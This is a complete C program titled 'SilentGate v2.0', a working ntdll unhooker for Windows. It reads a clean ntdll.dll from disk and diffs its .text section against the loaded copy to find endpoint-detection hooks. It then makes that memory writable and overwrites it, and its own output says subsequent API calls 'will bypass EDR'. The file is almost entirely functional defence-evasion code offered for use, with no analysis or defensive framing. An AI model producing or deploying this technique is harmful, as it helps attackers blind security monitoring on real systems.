#include <windows.h>
#include <psapi.h>
#include <stdio.h>

// SilentGate v2.0 - Ntdll Unhooker Test
// Author: JarDani
// Tests real ntdll unhooking on Windows

#define NTDLL_PATH "C:\\Windows\\System32\\ntdll.dll"

typedef struct {
    DWORD rva;
    DWORD raw_offset;
    DWORD raw_size;
} TEXT_SECTION;

// Find ntdll base address in process memory
HMODULE find_ntdll_base() {
    HMODULE mods[1024];
    DWORD   needed = 0;
    char    name[MAX_PATH];

    if (!EnumProcessModules(GetCurrentProcess(), mods,
            sizeof(mods), &needed))
        return NULL;

    DWORD count = needed / sizeof(HMODULE);
    for (DWORD i = 0; i < count; i++) {
        GetModuleFileNameExA(GetCurrentProcess(), mods[i], name, MAX_PATH);
        if (strstr(name, "ntdll.dll") || strstr(name, "ntdll.DLL")) {
            return mods[i];
        }
    }
    return NULL;
}

// Parse .text section from PE data
int parse_text_section(BYTE* data, TEXT_SECTION* out) {
    if (data[0] != 'M' || data[1] != 'Z') return 0;

    DWORD pe_offset    = *(DWORD*)(data + 0x3C);
    if (memcmp(data + pe_offset, "PE\0\0", 4) != 0) return 0;

    WORD  num_sections = *(WORD*)(data + pe_offset + 4 + 2);
    WORD  opt_size     = *(WORD*)(data + pe_offset + 4 + 16);
    DWORD sec_offset   = pe_offset + 4 + 20 + opt_size;

    for (WORD i = 0; i < num_sections; i++) {
        BYTE* sec = data + sec_offset + (i * 40);
        if (memcmp(sec, ".text", 5) == 0) {
            out->rva        = *(DWORD*)(sec + 12);
            out->raw_size   = *(DWORD*)(sec + 16);
            out->raw_offset = *(DWORD*)(sec + 20);
            return 1;
        }
    }
    return 0;
}

int main() {
    printf("[UNHOOKER] SilentGate v2.0 - Ntdll Unhooker\n");
    printf("[UNHOOKER] Author: JarDani\n\n");

    // Step 1 - Find ntdll base
    printf("[STEP 1] Finding ntdll.dll base address...\n");
    HMODULE ntdll_base = find_ntdll_base();
    if (!ntdll_base) {
        printf("[ERROR] Could not find ntdll.dll\n");
        return 1;
    }
    printf("         ntdll.dll base: %p\n", ntdll_base);

    // Step 2 - Read disk copy
    printf("[STEP 2] Reading clean copy from disk...\n");
    HANDLE hFile = CreateFileA(NTDLL_PATH, GENERIC_READ,
        FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[ERROR] Cannot open ntdll.dll from disk\n");
        return 1;
    }

    DWORD file_size = GetFileSize(hFile, NULL);
    BYTE* disk_data = (BYTE*)malloc(file_size);
    DWORD bytes_read = 0;
    ReadFile(hFile, disk_data, file_size, &bytes_read, NULL);
    CloseHandle(hFile);
    printf("         Read %lu bytes from disk\n", bytes_read);

    // Step 3 - Parse .text section
    printf("[STEP 3] Parsing PE header for .text section...\n");
    TEXT_SECTION text_sec = {0};
    if (!parse_text_section(disk_data, &text_sec)) {
        printf("[ERROR] Could not find .text section\n");
        free(disk_data);
        return 1;
    }
    printf("         .text RVA        : 0x%X\n", text_sec.rva);
    printf("         .text raw offset : 0x%X\n", text_sec.raw_offset);
    printf("         .text size       : %lu bytes\n", text_sec.raw_size);

    // Step 4 - Compare and find hooks
    printf("[STEP 4] Comparing memory vs disk to find EDR hooks...\n");
    BYTE* mem_text  = (BYTE*)ntdll_base + text_sec.rva;
    BYTE* disk_text = disk_data + text_sec.raw_offset;
    DWORD hooks     = 0;

    for (DWORD i = 0; i < text_sec.raw_size; i++) {
        if (mem_text[i] != disk_text[i]) {
            if (hooks < 5) {
                printf("         Hook at offset 0x%X: "
                       "memory=0x%02X disk=0x%02X\n",
                       i, mem_text[i], disk_text[i]);
            }
            hooks++;
        }
    }
    printf("         Total differences: %lu bytes\n", hooks);

    if (hooks == 0) {
        printf("[INFO]   ntdll appears clean - no hooks detected\n");
        free(disk_data);
        return 0;
    }

    // Step 5 - Change protection
    printf("[STEP 5] Changing .text protection to RWX...\n");
    DWORD old_protect = 0;
    VirtualProtect(mem_text, text_sec.raw_size,
        PAGE_EXECUTE_READWRITE, &old_protect);
    printf("         Old protection: 0x%X\n", old_protect);

    // Step 6 - Overwrite with clean bytes
    printf("[STEP 6] Overwriting hooked bytes with clean disk bytes...\n");
    memcpy(mem_text, disk_text, text_sec.raw_size);
    printf("         Wrote %lu clean bytes\n", text_sec.raw_size);

    // Step 7 - Restore protection
    printf("[STEP 7] Restoring original protection...\n");
    VirtualProtect(mem_text, text_sec.raw_size,
        old_protect, &old_protect);
    printf("         Protection restored\n");

    // Step 8 - Verify
    printf("[STEP 8] Verifying restoration...\n");
    DWORD remaining = 0;
    for (DWORD i = 0; i < text_sec.raw_size; i++) {
        if (mem_text[i] != disk_text[i]) remaining++;
    }

    printf("\n[RESULT] Hooks before : %lu\n", hooks);
    printf("[RESULT] Hooks after  : %lu\n", remaining);
    printf("[RESULT] Hooks removed: %lu\n", hooks - remaining);

    if (remaining == 0) {
        printf("\n[SUCCESS] ntdll fully unhooked\n");
        printf("[SUCCESS] All EDR user-mode hooks removed\n");
        printf("[SUCCESS] Subsequent API calls will bypass EDR\n");
    } else {
        printf("\n[PARTIAL] %lu hooks remain\n", remaining);
    }

    free(disk_data);
    printf("\n[UNHOOKER] Press any key to exit\n");
    getchar();
    return 0;
}